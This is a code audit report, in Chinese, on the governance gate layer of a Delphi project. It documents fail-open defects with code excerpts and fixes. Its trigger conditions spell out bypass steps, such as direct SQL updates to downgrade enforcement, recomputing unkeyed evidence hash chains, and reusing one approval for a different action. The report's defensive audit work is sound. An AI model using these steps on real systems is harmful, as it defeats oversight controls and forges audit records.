# DeepBase 代码审计报告 — Governance 层 + Tools 层

- **报告编号**：20260918-Governance-Tools
- **审计日期**：2026-09-18/19（UTC+8）
- **审计对象**：`d:\_Progs\02Business\DeepBase`
  - ①`Governance\` 全部 `.pas` — **实测 42 个**（用户预估 43，误差为 1；无 `__history`/`.bak` 混入）
  - ②`Tools\` 全部 `.pas` — **实测 66 个**，分布于 18 个目录（用户预估 66，一致）
  - 附带：`Tools\` 内的装配/文档文件（`.yml`/`.md`/`.bat`）超出 `.pas` 口径，因命中 🔴 凭据类风险，单列 §3.9
- **审计性质**：**只读**。全程未修改、未格式化、未移动任何源码文件；所有结论均来自直接读取取证。
- **方法**（四步）：
  1. **清单核对**：`Get-ChildItem -Recurse -Include *.pas`（排除 `__history`/`.bak`）+ 逐文件行数统计（以 Read 返回的 total 为准；`Measure-Object -Line` 对多字节行有 5–15% 低估，已校正）。
  2. **模式扫描**（全 109 文件 100% 覆盖）：拼 SQL（`Format('SELECT/INSERT/ALTER/PRAGMA...`、`' + 标识符`、`QuotedStr`）、线程（`TThread*`/`TMonitor`/`TCriticalSection`/`TEvent`/`SendInput`）、生命周期（`Create` vs `Free`/`finally`/`doOwnsValues`）、吞异常（空 `except`/`except //`）、fail-open（`Result := True`/未知枚举兜底/空值跳过校验）、半成品（`TODO|FIXME|not implemented|placeholder|stub|mock`）。
  3. **分层精读**：Governance 42/42 单元通读公共 API，其中 22 个逐行精读；Tools 66/66 单元通读公共 API，其中 12 个高危单元逐行精读（CLI.SSH / WebAPI.Auth / WebAPI.Core / WebAPI.WebSocket / WebAPI.Observability / SeedTool.uAntiTamperPackage / SeedTool.uBasicProtection / UpdaterHelper.Core / Publisher.Targets / DeepPublisher.MainForm / Studio.ImportExportFrame / Studio.BackupFrame / Studio.LicenseForm / CLI.Pipeline / Tray.SysMonitor / Tray.Automation）。
  4. **交叉验证**：每条 🔴/🟡 复核行号与代码原文；对"依赖调用方装配"的条件性风险降级入 §5 存疑区。
- **严重度定义**：🔴 崩溃 / 数据损坏 / 安全漏洞 / 门禁可绕过；🟡 功能缺陷；🔵 优化建议；证据不足或多态依赖 → §5 存疑区。
- **编号规则**：`G-*` Governance，`T-*` Tools；`R`=🔴，`Y`=🟡，`B`=🔵。

---

## 1. 总体统计

### 1.1 按目录 × 严重度

| 目录 | 🔴 | 🟡 | 🔵 | 存疑 | 小计 |
|---|---:|---:|---:|---:|---:|
| `Governance\`（门禁核心 + 证据/存储 + Schema/Validation/JsonLogic/AI/Model） | 14 | 14 | 6 | 3 | 37 |
| `Tools\CLI\` | 4 | 3 | 0 | 0 | 7 |
| `Tools\WebService\` | 7 | 2 | 1 | 5 | 15 |
| `Tools\Studio\` | 6 | 5 | 3 | 1 | 15 |
| `Tools\Tray\` | 2 | 5 | 1 | 0 | 8 |
| `Tools\SeedTool\` | 5 | 3 | 3 | 0 | 11 |
| `Tools\UpdaterHelper\` | 4 | 2 | 2 | 0 | 8 |
| `Tools\UniPublisher\` | 2 | 3 | 2 | 0 | 7 |
| `Tools\LogAnalyzer\|Calibration\|Gallery\|FMXGallery\|DBClientStub\` | 0 | 3 | 2 | 0 | 5 |
| `Tools\`（装配/文档，超 .pas 口径） | 1 | 2 | 0 | 0 | 3 |
| **合计** | **45** | **42** | **20** | **9** | **116** |

> 上表为“已登记独立条目数”（按 `§2`/`§3.x` 的 `#### ` 标题逐项累加，行小计与列合计已交叉校验）。同一缺陷若在同一条目下列举多个侧面（如 T-STU-R05 的 ①–⑤）计为 1 条；§5 存疑区的 9 条（Q1–Q9）单独计入“存疑”列，不另入 🔴/🟡/🔵。

### 1.2 按 7 个审计维度

> 下列“命中”为**非排他标注**（一个条目可同时命中多个维度），因此列合计（128）大于条目总数（116）。

| 维度 | 结论 | 命中 |
|---|---|---:|
| ① 正确性 bug | **发现问题**（默认值与注释相反、mock 假成功、CSV/多部分解析错、不可达状态） | 23 |
| ② 内存与生命周期 | **发现问题**（每连接泄漏、TComparer 泄漏、hProcess 泄漏、UAF×4、double-free 面） | 14 |
| ③ 线程安全 | **发现问题**（锁外 Connect、无锁字典/布尔、闭包捕获活对象、概率式清理） | 13 |
| ④ 异常处理 | **发现问题**（11 处吞异常；4 处异常路径资源/handle 泄漏；2 处 raise 绕过结果通道） | 17 |
| ⑤ 安全 | **发现问题**（治理门禁端到端可绕过；SQL/OS 命令注入各 1 类多实例；凭据/密钥明文 6 处；路径遍历/zip-slip 4 处） | 31 |
| ⑥ 性能 | **发现问题**（O(n²) 拼串×5、每次调用重跑 KDF、概率清理无界增长、基数无界指标） | 12 |
| ⑦ 架构 | **发现问题**（治理层未接入真实执行路径、门禁判定 3 处第二真源、超 2000 行文件 **未发现**、死代码/半成品 20 处） | 18 |

> **⑦ 维度明确无问题的子项**：**超 2000 行大文件未发现问题**（108 个文件实测最大为 `Tools\WebService\DeepBase.WebAPI.Auth.pas` 1866 行，`Tools\CLI\DeepBase.CLI.Interactive.pas` 1568 行，`Governance` 最大 `ConfigRegistrar.pas` 1133 行；均 <2000）。

---

## 2. Governance 层发现

治理架构：`Types → Interfaces → Model → KeyResolver/GateResolver/ActionGrid/DueChecker/RouteResolver/ObserveGateResolver/ActionExecutor/Runtime/Lifecycle`，依赖方向本身正确（详见 §2.6）。

### 2.1 模式与默认值 —— fail-open 主链（🔴 最密集区）

#### G-R01 🔴 篡改检测"发现即降级并重新签名"，销毁降级痕迹
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.ConfigRegistrar.pas:1023-1035`
```pascal
    // DATA2-023: Verify integrity. If HMAC does not match, the mode has
    // been tampered with (e.g. DB-level write). Default to enforce for safety.
    if LMode <> '' then
    begin
      if ValidateModeHMAC(LMode, LSig) then
        Result := LMode
      else
      begin
        // Tampered mode detected — reset to safe default and re-sign.
        SetMode(MODE_OBSERVE);
        Result := MODE_OBSERVE;
      end;
    end;
```
**说明**：三重缺陷叠加。
1. 注释声称 "Default to **enforce** for safety"，代码写入 `MODE_OBSERVE` —— **注释与实现相反**，且 observe 是本层最弱的门禁态（见 G-R04）。
2. `SetMode` 会重新计算并写入合法 HMAC 签名（`:1041-1046`），即**把"检测到篡改"这一事件静默落地为一个签名合法的 observe 配置**：下次启动读到的是一条校验通过的记录，篡改/降级痕迹被完全抹除，无任何日志、无证据记录（`FEvidenceRecorder` 未参与）。
3. `Result := MODE_OBSERVE`（`:1001`）同时是"读不到 mode 行"和"mode 行为空串"的默认值 —— 配置表被清空/新库未初始化即等于 observe。
**触发条件**：① 任何直接 `UPDATE governance_config SET value='enforce'` 而不同步签名的运维/攻击动作 → 降级为 observe；② 删除 mode 行 → observe；③ 新库首启（配合 G-R03）→ observe。
**建议修复**：篡改分支改为 `Result := MODE_ENFORCE` 且**不要覆盖签名**（保留矛盾现场）；同时 `LogBlocked`/写安全事件证据；注释与实现对齐并加 ASY 编号回归测试。`GetMode` 的默认分支应为 enforce 或显式抛"配置不可验证"异常，而非静默 observe。

#### G-R02 🔴 签名密钥不可用时 HMAC 恒不匹配 → 每次启动摧毁 enforce（fail-open 死锁）
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.ConfigRegistrar.pas:964-994`
```pascal
    if not TKeyManager.Instance.IsUnlocked then
      Exit;                       // Result := '' —— 未初始化即退出
    LKey := TKeyManager.Instance.GetActiveKeyForPurpose(kpSigning);
    Result := TEncodingUtils.HexEncode(
      THashUtils.HMAC(LKey, TEncoding.UTF8.GetBytes(AMode), haSHA256));
  except
    // If KeyManager is not initialized or signing key is unavailable,
    // return empty — caller should treat as "unverifiable → default enforce".
    Result := '';
  end;
```
**说明**：`ComputeModeHMAC` 在密钥库未解锁时返回 `''`，`ValidateModeHMAC('enforce','')` 恒为 False，于是 G-R01 分支在**每次启动且密钥库尚未解锁**（GUI 启动顺序里 `RegisterGovernance` 通常早于解锁）时把 `enforce` 降级为 `observe` 并重新签名。注释明确写着期望语义是"unverifiable → **default enforce**"，实现给出的是 observe —— **第二真源：期望语义只存在于注释里**。
**触发条件**：密钥库延迟解锁 / `TKeyManager.Instance` 未初始化 / 无 `kpSigning` 活跃密钥 → 治理模式永久停留在 observe，且无法通过配置页恢复（每次保存都会被下一次启动摧毁）。
**建议修复**：区分三态返回值（匹配/不匹配/不可验证），"不可验证"必须走 enforce + 显式告警；`Exit` 前显式 `Result := ''`；为"解锁前不可判定"引入 `MODE_UNKNOWN` 并禁止在未知态自动写库。

#### G-R03 🔴 Lifecycle 默认 gmObserve，只有 DB 显式写 'enforce' 才升级
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.Lifecycle.pas:143`、`:214-221`
```pascal
  FMode := gmObserve;                       // :143 构造默认
...
  if SameText(LDBMode, 'enforce') then      // :214-221 仅显式 enforce 才升级
    FMode := gmEnforce;
```
**说明**：默认值取"最弱"而非"最安全"。与 G-R01/G-R02 构成完整链：**新装 = observe，篡改 = observe，密钥未就绪 = observe**。治理层在 100% 的"未成功配置"路径上都是放行态。
**触发条件**：任何未完成配置流程的部署（含所有 CI/单测环境）→ 门禁装饰化。
**建议修复**：默认 `gmEnforce`；`SwitchMode`（`:114`）只允许向更强方向自动变更，向 observe 降级必须显式带裁决凭证并记证据。

#### G-R04 🔴 ObserveGateResolver 把任意阻挡态改写为 gsOpen
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.ObserveGateResolver.pas:81-98`
```pascal
    // Override to open so downstream EnterGate proceeds.
    Result.State := gsOpen;
    Result.BlockedReason := '';
```
**说明**：装饰器把 `gsDisabled/gsBlocked/gsConflict/gsClosed` 一律改写为 `gsOpen` 并清空原因，`TOCGSRuntime.EnterGate` 的 `if LResolution.State <> gsOpen`（`Runtime.pas:99`）因此永不阻挡。这在"observe 用于灰度观察"的语义下是有意为之，但与 G-R01~R03 结合后，**observe 成为默认态**，等于运行时门禁恒开。同时 `BlockedReason := ''` 丢弃了下游 `Explain`/`Feedback` 需要的诊断信息。
**触发条件**：模式 = observe（默认）。
**建议修复**：override 时保留 `OriginalState` 字段供证据/UI 使用；observe 模式禁止用于 `rmCommit` + `rlL3` 组合（高风险动作即使在 observe 也应硬拒），并在启动时以醒目日志/证据声明"当前处于 observe，门禁不生效"。

#### G-R05 🔴 完整性哈希链以空密钥构造 → 无密钥自签，等价于无校验
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.Lifecycle.pas:205`、`:231`；`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.Seal.pas:117`
```pascal
  FEvidence := TEvidenceStoreSQLite.Create(FConfigDB, [], False);   // :205  HMAC key = ''
  FReviewQueue := TReviewQueueSQLite.Create(FConfigDB, [], False);  // :231  HMAC key = ''
```
**说明**：第三参数 `False`（ownsConnection）+ 空密钥数组，使 Evidence 哈希链与 ReviewQueue 挑战链退化为 `SHA-256(payload‖prev)`。攻击者只要能写 DB 行，即可**用同一算法重算整条链**（无需任何秘密），从而无痕改写"谁批准了什么"。`Seal.pas:117` 同型（无密钥时降级 `THashSHA2`）。`GENESIS_HASH` 为公开常量，不构成锚点。
**触发条件**：SQLite 文件被离线编辑（治理库是本地 `.db`，用户态可写）。
**建议修复**：密钥缺失时**拒绝启动治理层**（fail-closed）而非降级；或强制从 `TKeyManager(kpSigning)` 取密钥；引入仅存于密钥库的链头锚点（Merkle root 外证），使离线重算不可行。

#### G-R06 🔴 门禁状态不可达：gsLocked / gsFrozen 全库无赋值 → "封存/冻结"不产生拦截
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.GateResolver.pas:112-119`；`...\DeepBase.Governance.Types.pas:16-24`
```pascal
  if LFailCount = 0 then
    Result := gsOpen
  else if LHasPermissionFail then
    Result := gsDisabled
  else if LFailCount > 1 then
    Result := gsConflict
  else
    Result := gsBlocked;
```
**说明**：`TGateState` 定义 7 态，但全仓检索 `:= gsLocked` / `:= gsFrozen` **仅出现在 FeedbackResolver 的模板字典**（`FeedbackResolver.pas:86/93`，即"已封存/已冻结"的 UI 文案）。也就是说：**一个被封存（Seal）或被冻结的治理对象，其门禁解析结果永远不会是 gsLocked/gsFrozen，`EnterGate` 不会因此拒绝**。`Seal.pas` 的封存、ReviewQueue 的冻结在门禁判定路径上是断线的。FeedbackResolver 中两条模板是死分支。
**触发条件**：对已封存条目发起 `rmCommit` 执行 → 只要条件表达式通过即放行。
**建议修复**：`DetermineState` 增加封存/冻结优先级（`if 已 Sealed then Exit(gsLocked)`）；为 gsLocked/gsFrozen 补 `TGateConditionKind` 评估器或独立状态源；加"不可达枚举"静态检查（每个 `TGateState` 值必须有生产者）。

#### G-R07 🔴 条件"语义类型"被单个通用闭包抹平 → 7 类门禁条件实为 1 类
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.JsonLogicEvaluator.pas:72-92`
```pascal
  for LKind := Low(TGateConditionKind) to High(TGateConditionKind) do
    AResolver.RegisterEvaluator(LKind,
      function(ACondition: TGateCondition; AContext: TJSONObject): Boolean
      ...
          Result := LEngine.ApplyStr(ACondition.Expression, AContext);
```
**说明**：7 种 `TGateConditionKind`（permission/state/risk/contract/evidence/**seal**/**accountability**，`Types.pas:58-66`）被注册为**同一个不区分 Kind 的 JsonLogic 闭包**。后果：`gckSeal` 条件从不查询封存存储、`gckAccountability` 条件从不查询责任链、`gckEvidence` 条件从不查询证据表 —— 它们只是"恰好叫这个名字的表达式"。治理分类法（OCGS 第四层的核心概念）**在执行路径上无任何效果**，真实判定逻辑的第二真源是配置里的表达式字符串。
**触发条件**：任何依赖"声明 seal/accountability 条件即获得该保护"的配置。
**建议修复**：按 Kind 注册专用评估器（`gckSeal` 必须查 `ISealStore`，`gckEvidence` 必须查 `IEvidenceStore`）；或承认"Kind 仅用于展示"并从安全论证中移除其语义承诺（更新 `Explain`/文档，避免误导审计）。

#### G-R08 🔴 DueChecker 被两处独立实现，判定口径不同且一处以裸异常绕过结果通道
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.ActionExecutor.pas:108-118` 与 `d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.ActionGrid.pas:279-285`
```pascal
// ActionExecutor：无条件检查，失败返回 Blocked
  if (FDueChecker <> nil) and (AMode <> rmPreview) then
  begin
    LDue := FDueChecker.Check(AActionKey, AContext);
    if LDue.Verdict <> dvPass then
    begin
      Result := TActionResult.Blocked(AActionKey, LDue.Reason);
      if FEvidenceRecorder <> nil then
        FEvidenceRecorder.LogBlocked(AActionKey, LDue.Reason, AContext);
      Exit;
    end;
  end;

// ActionGrid：仅当 DueRef<>'' 才检查，失败抛裸 Exception
  if (AMode <> rmPreview) and (FDueChecker <> nil) and (LDueRef <> '') then
  begin
    LDue := FDueChecker.Check(AActionKey, AContext);
    if LDue.Verdict <> dvPass then
      raise Exception.CreateFmt('Due check failed for %s: %s', ...);
  end;
```
**说明**：经 `ActionExecutor.Execute → ActionGrid.Run` 的正常路径，**同一"合当检查"执行两次**，且：
- 触发条件不同（一处看 `LDueRef<>''`，一处无条件）→ 一个 `DueRef=''` 但风险等级需检查的动作，在两层得到相反结论；
- 失败传播不同（一处 `Blocked` + 记证据，一处**裸 `Exception` 且不记证据**）→ 走 raise 分支时调用方拿到异常，`EnterGate` 的 `Result` 通道与证据落库被跳过，**审计链断裂**；
- `raise Exception` 未使用项目异常基类（`DeepBase.Exceptions`），上层无法分类处理。
**建议修复**：合当检查单点化（只在 Executor 或只在 Grid），另一处删除或降级为断言；统一失败为 `TActionResult.Blocked` + `LogBlocked`；异常类型改用 `E GovernanceDueViolation`。

#### G-R09 🔴 裁决凭证不绑定动作：`Verify` 从不使用 AActionKey → 一次批准可执行任意动作
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.ReviewQueue.pas:180-260`
```pascal
function TReviewDecisionVerifier.Verify(const AActionKey, AArgumentsDigest,
  AConfirmation: string; ...): Boolean;
...
  if not FQueue.GetChallenge(AConfirmation, AOutChallenge) then ...  // ① 存在
  if not SameText(AOutChallenge.ParametersDigest, AArgumentsDigest) then ... // ② 入参摘要
  if AOutChallenge.Status <> rsApproved then ...                     // ④ 已批准
  // ⑤ 作用域；⑥ asOnce 未消费
  Result := True;
```
**说明**：形参 `AActionKey` 在函数体内**从未被引用**（无 `AOutChallenge.ActionIntentId` 与 `AActionKey` 的任何比较）。因此一个针对低风险动作 A 申请到并获批准的 `reviewId`，可以原样携带去执行高风险动作 B —— 只要两者的 `parameters_digest` 相同。**"无参数/参数相同"的高风险动作（digest 为同一空值摘要）与已获批准的低风险动作天然共享 digest**，这正是最常见的形态。`ActionExecutor:90` 传入 `AActionKey` 说明契约本意就是要绑。
**触发条件**：调用 `EnterGate(gateB, ctx{parameters_digest: digestOfA}, reviewIdOfA)`。
**建议修复**：② 之前插入 `if not SameText(AOutChallenge.ActionIntentId, AActionKey) then Exit(拒绝)`；补一条"跨动作移植"的必失败回归用例（H1 级）；同时在 `TReviewQueueSQLite.ComputePayload` 已含 `ActionIntentId`（`ReviewQueue.SQLite.pas:402`），故哈希层已能检测改列，但**语义层漏比对**是纯代码缺陷，与篡改无关。

#### G-R10 🔴 不提供凭证即完全跳过人工批准校验
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.ActionExecutor.pas:81-94`
```pascal
  // 0. ASY-GOV-006 阶段3：裁决验证（fail-closed）
  //    confirmation 非空 = 调用方主张已获人工批准，必须经 verifier 校验。
  if AConfirmation <> '' then
  begin
    ...
```
**说明**：裁决校验的开关是"**调用方是否声称有凭证**"，而不是"**该动作是否需要凭证**"。需要人工批准的动作（`rlL3` / `Due` 要求裁决）在 `AConfirmation=''` 时直接进入 1/2 步，而 `DueChecker` 又从不检查"是否要求裁决"（见 G-R11）→ **整套 ReviewQueue/挑战/签名/HMAC 链可被"什么都不传"绕过**。注释里的 "fail-closed" 只在"有凭证但无 verifier"这一支成立。
**触发条件**：任何本应要求批准的动作，调用时省略第 4 参数（`IOCGSRuntime.EnterGate` 的 `AConfirmation` 有默认值 `''`，`Runtime.pas:44`）→ 静默跳过。
**建议修复**：先由 DueChecker/风险等级判定"是否需要裁决凭证"，需要而缺失即 `Blocked`；把"需要凭证"变成动作注册期的显式属性（避免运行时推断）。

#### G-R11 🔴 DueChecker：未知动作降级为最低风险并直接 Pass；RequireEvidence/RequireSeal 从未检查
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.DueChecker.pas:169-181`、`:142-158`、`:120-131`
```pascal
  // :169-181 风险等级解析：未知 → rlL0
  ...
  if LLevel = rlL0 then
    Result.Verdict := dvPass;         // 无风险：无需治理
  // :142-158：LDue.RequireEvidence / RequireSeal 被读取但从未参与判定
  // :120-131：HasAccountability 仅判断 key 是否存在
```
**说明**：三个 fail-open 同型：① 未登记/解析失败的动作 → `rlL0` → `dvPass`，"不认识即放行"；② DueSet 里的 `RequireEvidence`/`RequireSeal` 标志被完整建模却无消费点（死字段）；③ `HasAccountability` 做 key 存在性检查而非有效性检查（空串/占位也算有）。
**触发条件**：新动作忘记登记风险等级；或注册时 key 拼写不一致（大小写/前后空格）→ 查不到 → `rlL0` → 放行。
**建议修复**：未知动作 → 最高风险 `rlL3` + `dvRequireApproval`；补齐 RequireEvidence/RequireSeal 消费逻辑或从模型删除；`HasAccountability` 校验非空+格式+可解析。

#### G-R12 🔴 路由目标不受 gate 授权动作集约束；条件表达式异常静默降级到 fallback
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.Runtime.pas:113-126`；`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.RouteResolver.pas:136-142`、`:167-185`
```pascal
// Runtime
  LTargetAction := '';
  if FRouteResolver <> nil then
    LTargetAction := FRouteResolver.Resolve(AGateKey, AContext);
  if (LTargetAction = '') and (Length(LResolution.AvailableActions) > 0) then
    LTargetAction := LResolution.AvailableActions[0];
  ...
    Result := FActionExecutor.Execute(LTargetAction, AContext, AMode, AConfirmation)

// RouteResolver
    try
      if FJsonLogic.ApplyStr(LRule.ConditionExpr, APayload) then
        Exit(LRule);
    except
      // JsonLogic 表达式错误时跳过该规则，不崩溃
      Continue;
    end;
  ...
    Result := GetFallback(ASourceGateKey);
```
**说明**：`GateResolver` 已把该 gate 允许的 `AvailableActions` 算出（`GateResolver.pas:145`），但 `EnterGate` **从不校验 `LTargetAction ∈ AvailableActions`**。`RouteResolver`/`FFallbacks` 可返回**任意已注册 action key**（`SetFallback(源 gate, 任意 target)`，`RouteResolver.pas:114-117`），执行器只按 action 自身做检查。→ 通过配置一条路由/fallback，可在"只获批低危动作"的 gate 下执行高危动作：**横向权限提升 + 门禁旁路**。更隐蔽的是 :139-141 把"表达式写错"静默转成"该规则不匹配"，于是所有规则异常时流量落到 fallback，**配置错误表现为绕过而非报错**，且无任何日志/证据。
**触发条件**：① 配一条 `SetFallback('gate.low','action.high')`；② `ConditionExpr` 语法错误或引用缺失字段 → 规则恒不匹配 → 恒走 fallback。
**建议修复**：`Execute` 前强制 `if not LResolution.AvailableActions.Contains(LTargetAction) then Exit(Fail('route outside gate scope'))`；表达式异常须记录 `route.rule_error` 证据并使 gate 判定为失败（fail-closed），不得静默 Continue；`SourceGateKey` 比较（`:128`）改用大小写不敏感以与 KeyResolver 口径一致。

### 2.2 证据链与可审计性

#### G-R13 🔴 DryRun / 无 Bridge 的空操作被记为"执行成功"证据
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.ActionGrid.pas:304-309` + `d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.EvidenceRecorder.pas:449-454`
```pascal
// ActionGrid.Run —— 没有 bridge 时
  if Length(LBridgeRefs) = 0 then
    Result := TActionResult.DryRunOK(AActionKey, 'No bridge configured (noop)')
  else
    Result := TActionResult.Success(AActionKey);

// EvidenceRecorder —— 状态映射
    arsDryRun: LStatus := erSuccess;
```
**说明**：一个注册了但没接 bridge 的动作（半成品/漏配）在 `rmCommit` 下产生 `arsDryRun`，被 Evidence 层写成 `erSuccess`：**审计台账记录了"动作已成功执行"，实际任何副作用都没发生**。同时 `ActionExecutor:126` 只在 `arsSuccess` 才消费 asOnce 凭证，noop 不消费 → 凭证可反复用于制造"成功证据"。这是证据链失真，比缺日志更糟（事后无法区分"做了"与"什么都没做"）。
**触发条件**：动作注册时未 `RegisterBridge`，或 `FBridges.TryGetValue` 因 key 大小写失败（`:263`）导致 `LRefCount=0`。
**建议修复**：`erSuccess/erDryRun/erNoop` 三分；noop 应产 `erFailed('no bridge configured')` 并触发注册期校验错误（见 G-Y08）；asOnce 对 noop 也应消费或明确不记录。

#### G-Y13 🟡 Evidence 哈希 payload 只覆盖 10 个字段，其余列不受链保护
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.EvidenceStore.SQLite.pas:320-334`
**说明**：`ComputePayload` 拼接的字段集少于表列数；未纳入 payload 的列（含 `:384-389` 状态映射相关列）被离线修改后链校验仍然通过 —— 防篡改承诺与表结构不同步。
**触发条件**：直接 `UPDATE governance_evidence SET <未纳入列>`。
**建议修复**：以"列清单常量 + 编译期/测试期一致性断言"生成 payload，或对所有非哈希列做 Merkle 摘要；新增列时必须同时进 payload，否则单测失败。

#### G-Y14 🟡 未知枚举字符串降级为成功/挂起状态
**文件**：`EvidenceStore.SQLite.pas:384-389`（未知 → `erSuccess`）、`ReviewQueue.SQLite.pas:306-313`（未知 → `rsPending`）
**说明/触发条件**：DB 中状态列被写成未识别值（或未来版本新增枚举回读旧版本），读路径静默映射为"成功"，安全语义反了。
**建议修复**：未知状态 → `erUnknown`/`erFailed` 并在 UI/告警显式呈现；解析函数对未知值抛专用异常。

#### G-Y15 🟡 `QueryByUser` 等读路径只填充 4 个字段，返回半空记录
**文件**：`Governance\DeepBase.Governance.EvidenceStore.SQLite.pas:499-537`
**说明/触发条件**：调用方拿到 `TEvidenceEntry` 但多数字段为空串/0，用于导出或再签名时静默产生不一致数据。
**建议修复**：共享 `ReadEvidenceRow` 单一反序列化函数（消除"每处 SELECT 各填一部分"的第二真源）。

#### G-Y16 🟡 ReviewQueue 写路径多语句无事务
**文件**：`Governance\DeepBase.Governance.ReviewQueue.SQLite.pas:545-610`
**说明**：`RecordDecision` 需同时写 `human_decisions` 行与原子 UPDATE `review_challenges`；注释声称"原子 UPDATE 防并发双重裁决（fail-closed）"（`:13`），但两条语句未包在同一事务 → 中途失败留下"有裁决无状态推进"的半态。
**建议修复**：`StartTransaction/Commit/Rollback` 包裹；`UPDATE ... WHERE status='pending'` 后必须检查影响行数（为 0 则回滚裁决行）。

#### G-Y17 🟡 读路径不持 FLock，与热写入竞态
**文件**：`ReviewQueue.SQLite.pas`（读函数群）、`EvidenceStore.SQLite.pas`（读函数群）
**说明**：写路径持 `FLock`、读路径不持 → `Verify` 的 ③"ExpireOverdue 后重读"（`ReviewQueue.pas:212-218`）与并发写交叉时可读到中间态。
**建议修复**：读写同锁，或把 `ExpireOverdue` 与后续读放进同一持锁事务。

#### G-Y18 🟡 `asOnce` 消费结果被丢弃 → 并发重放不可检测
**文件**：`Governance\DeepBase.Governance.ActionExecutor.pas:124-132`
```pascal
      FVerifier.Consume(LChallenge.ReviewId, LChallenge)
```
**说明**：返回值未接收/未判断，注释说"记录但不回滚"，实际连记录都没有；结合 G-R06（`Verify` 不比对 digest）与 §5 的时序（消费发生在 `Run` **之后**），同一凭证可在并发下执行两次且台账无痕。
**建议修复**：`if not Consume(...) then LogBlocked(...)`；把消费提前到 `Run` 之前（先占位后执行，失败再显式退款），实现真正的"恰好一次"。

#### G-B11 🔵 Verify 每次调用都 `GetChallenge → ExpireOverdue（全表 UPDATE）→ GetChallenge`
**文件**：`Governance\DeepBase.Governance.ReviewQueue.pas:205-218`
**建议**：合并为一次读 + 懒过期（只在读到 pending 且超时才 UPDATE）。

#### G-B12 🔵 摘要/签名比较用 `SameText`（非常量时间、大小写不敏感）
**文件**：`ReviewQueue.pas:221`（`ParametersDigest`）、`uBasicProtection:471-474`（同型，见 T-Seed-R02）
**建议**：统一 `THashUtils.ConstantTimeCompare`；十六进制摘要比较应大小写敏感。

#### G-B13 🔵 对含托管字段的 record 使用 `FillChar`
**文件**：`Governance\DeepBase.Governance.ReviewQueue.pas:195-196`（`Finalize` 后紧跟 `FillChar`）
**说明**：当前顺序侥幸安全（Finalize 已清零）；一旦删除 `Finalize` 即变成"把 string 字段置为非法指针"→ 后续赋值 dec-ref 野指针 → 崩溃。**脆弱代码**。同类：`Tools\UpdaterHelper\UpdaterHelper.Core.pas:386`。
**建议**：托管记录只用 `AOutChallenge := Default<TReviewChallenge>`。

### 2.3 配置/校验/内存生命周期

#### G-Y19 🟡 ActionGrid 不接管所有权却自行 Create → 泄漏 + 双实例
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.ActionGrid.pas:74`、`:99-111`
**说明**：字段声明为不 owns（`doOwnsValues` 未开 / 无 destructor Free），却在内部 `Create` 并覆盖 → 原实例泄漏；同时外部可 `Set` 第二个实例，出现两份动作表。
**建议**：明确单一所有权（构造注入 + `doOwnsValues`），或在 destructor 中按创建标志释放。

#### G-Y20 🟡 KeyResolver 全文无锁，与 ActionGrid 的 D-003 修复形成不一致
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.KeyResolver.pas`（全单元）
**说明**：`ActionGrid.pas:316-319` 的注释明确记录"读路径须持锁——与热注册路径并发会撞 rehash/UAF"（D-003），但同样被热注册的 `TKeyResolver` 无任何锁 → `GateResolver.Resolve → FKeyResolver.ResolveGateKey` 与注册并发时 **UAF/AV**。修复只做在了一半地方。
**建议**：按 ActionGrid 模式给 KeyResolver 加读写锁；把该模式提为公共基类或文档化契约。

#### G-Y21 🟡 Lifecycle 析构仅在 FStarted 时 Shutdown，且自陈注释承认悬垂
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.Lifecycle.pas:148-153`、`:308-348`
**说明**：`:308-348` 一段注释原文写"every raw pointer below is DANGLING"（原始指针在 Shutdown 后被闭包/事件持有）；`destructor` 只在 `FStarted` 为真时才 `Shutdown`，中途构造失败（`RegisterGovernance` 抛异常）时已创建的组件不被释放 → 泄漏 + 闭包捕获的裸指针可被后续事件触发。
**建议**：destructor 无条件调用幂等 `Shutdown`；用 `SafeC`/接口替代 raw pointer 或引入失效标记（generation counter）。

#### G-Y22 🟡 Validation：INV-4 用字符串关键字代理真实语义
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.Validation.pas:308-331`
**说明**：INV-4（应校验" accountability/证据 完备性"）实际实现为检测 `DueRef` 里是否含 `'accountability'` 子串 → 写 `DueRef='accountability'` 即可让校验器报"合规"，**校验被字符串欺骗**。
**建议**：改为解析 DueSet 结构后调用 `DueChecker`/`IKeyResolver` 做真实查询；字符串包含式检查全部替换为 AST 级查询。

#### G-Y23 🟡 Validation：INV-8~INV-15 八条规则是返回空的死骨架，且注释承认默认不阻断
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.Validation.pas:436-489`
```pascal
// 注意：若需要 fail-closed 行为（规则未实现时阻止封版），可在注册后改为
// 返回包含 vsSevere 的 Issue 数组。
function TGateValidationEngine.RuleINV12_L3NoSeal: TArray<TValidationIssue>;
begin
  // TODO(DATA2-032): implement INV-12 — L3 high-risk actions must be sealed (Phase P10).
  Result := nil;
end;
```
**说明**：8 条不变式恒返回 `nil`（=无问题），注释显式承认"未实现时**不**阻止封版"。其中 INV-9（路由环检测）、INV-12（L3 必须封存）、INV-10（不可达 gate）恰是 G-R06/G-R12 需要的外部保障 → **安全属性由"未来某 Phase"承诺，当前为零**。
